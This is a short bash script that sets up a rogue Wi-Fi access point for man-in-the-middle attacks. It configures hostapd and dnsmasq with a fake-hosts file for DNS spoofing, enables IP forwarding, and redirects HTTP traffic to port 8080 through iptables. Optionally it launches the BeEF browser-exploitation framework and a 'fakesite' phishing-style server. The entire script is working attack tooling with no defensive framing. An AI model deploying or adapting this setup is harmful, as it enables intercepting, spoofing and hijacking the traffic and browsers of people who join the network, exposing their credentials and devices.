#!/bin/bash

# Disable NetworkManager
# If this doesn't work, manually kill your network-manager process.
nmcli radio wifi off
rfkill unblock wlan

# Setup interface address
ifconfig wlan0 10.0.0.1/24 up

# Configure routing
sysctl -w net.ipv4.ip_forward=1
#Intercept HTTP Requests
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Start daemon(s)
dnsmasq -C dnsmasq.conf -H fakehosts.conf -d &

# Start Webdaemon (Optional) & hostapd
if [ "$1" == "runserver" ]; then
	hostapd ./hostapd.conf > hostapd.log &
	echo "Starting webserver..."
        gnome-terminal -x sh -c "cd /usr/share/beef-xss/;ruby beef;bash"
	source fakesite/venv/bin/activate
	python fakesite/fakesite.py
        	
	deactivate
	pkill hostapd
else
	hostapd ./hostapd.conf > hostapd.log 
fi

pkill dnsmasq
